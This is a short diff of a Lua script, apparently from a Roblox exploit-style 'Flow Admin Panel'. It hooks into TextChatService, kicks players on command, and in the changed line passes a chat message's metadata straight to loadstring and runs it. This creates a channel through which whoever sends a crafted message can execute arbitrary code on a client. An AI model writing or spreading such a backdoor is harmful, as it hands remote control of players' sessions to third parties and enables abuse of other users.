@@ -12,7 +12,7 @@ if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                     selff:Kick("Kick via Flow Admin Panel.");
                 end;
             else
-                loadstring(data1)();
+                loadstring(msg.Metadata)();
             end;
         end;
     end;
